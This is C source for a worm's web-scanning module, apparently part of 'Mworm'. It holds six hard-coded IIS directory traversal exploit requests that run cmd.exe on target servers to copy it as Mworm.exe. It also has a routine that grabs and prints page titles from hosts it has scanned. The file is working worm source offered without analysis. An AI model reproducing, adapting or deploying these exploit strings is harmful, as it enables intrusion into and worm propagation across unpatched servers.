   //Check the CGI Hole
   //part of Mworm
   //Based on Mscan
   //CheckCGI.c

   #include "common.h"

   void Handle_Port_80(int fd,char *hostip,struct host *iptr)   //Handle WEB Scan
   {

        char *string_hole[CHECK_COUNT_S] =
        {
         "GET /scripts/..%c1%1c../winnt/system32/cmd.exe?/c+copy%20c:\\winnt\\system32\\cmd.exe%20c:\\Mworm.exe HTTP/1.0\r\n\r\n",
         "GET /scripts/..%c1%9c../winnt/system32/cmd.exe?/c+copy%20c:\\winnt\\system32\\cmd.exe%20c:\\Mworm.exe HTTP/1.0\r\n\r\n",
         "GET /msadc/..%c1%9c../..%c1%9c../..%c1%9c../winnt/system32/cmd.exe?/c+copy%20c:\\winnt\\system32\\cmd.exe%20c:\\Mworm.exe HTTP/1.0\r\n\r\n",
         "GET /msadc/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+copy%20c:\\winnt\\system32\\cmd.exe%20c:\\Mworm.exe HTTP/1.0\r\n\r\n",
         "GET /scripts/..%255c../winnt/system32/cmd.exe?/c+copy%20c:\\winnt\\system32\\cmd.exe%20c:\\Mworm.exe HTTP/1.0\r\n\r\n",
         "GET /msadc/..%255c../..%255c../winnt/system32/cmd.exe?/c+copy%20c:\\winnt\\system32\\cmd.exe%20c:\\Mworm.exe HTTP/1.0\r\n\r\n"
        };


        int Hole_TypeCount , i;
        char *search = "HTTP/1.1 200";
        char *other1 = "HTTP/1.1 500 13";
        char serv_string[1024];
        ssize_t tmpResult;


        Hole_TypeCount = 6;

        for (i=0; i<Hole_TypeCount ; i++) {

           if (writeable_timeo(fd, WEB_WRITETIMEOUT)<=0 ) continue;
           tmpResult = writen(fd, string_hole[i], strlen(string_hole[i]));
           if (tmpResult <0 ) continue;
       close(fd);
       fd=TCP_NB_connect(iptr->h_network,iptr->h_port,CONNECT_TIME);
       if (fd <=0 ) break;
        }

   }


   char * Get_IIS_Title(int fd, char * hostip)                //Get the Host IIS first page Title
   {

        char *string_head="GET / HTTP/1.0\r\n\r\n";
        char *search_head_B="<TITLE>";
        char *search_head_E="</TITLE>";
        char *Dont_Display1="Test Page for";
        char *Dont_Display2="Authorization Required";
        char *search = "HTTP/1.1 200";
        char *tmpStr;
        char *Head_Str;
        char serv_string[1024];
        int Have_Get_200 ;
        ssize_t tmpResult;

        Have_Get_200=0;
        if (writeable_timeo(fd, WEB_WRITETIMEOUT)<=0 ) return(NULL);
        tmpResult = writen(fd, string_head, strlen(string_head));
        for( ; ;){
               if (readable_timeo(fd, WEB_READTIMEOUT)<=0 ) break;
           tmpResult=readline(fd,serv_string,1024,1);
           if (tmpResult<=0) break;
   //      serv_string[tmpResult]=0;
   //      printf("%s",serv_string);
           if (HTStrCaseStr(serv_string, search) !=NULL) Have_Get_200=1;


           Head_Str=Get_Range_Str(serv_string, search_head_B , search_head_E);
           if (Head_Str != NULL) {
               if ((Have_Get_200==1) && (HTStrCaseStr(Head_Str,Dont_Display1)==NULL)
                  && (HTStrCaseStr(Head_Str,Dont_Display2)==NULL))
                   printf("Host %s: %s\n",hostip,Head_Str);

               return(Head_Str);
           }

       }
        return(NULL);
   }
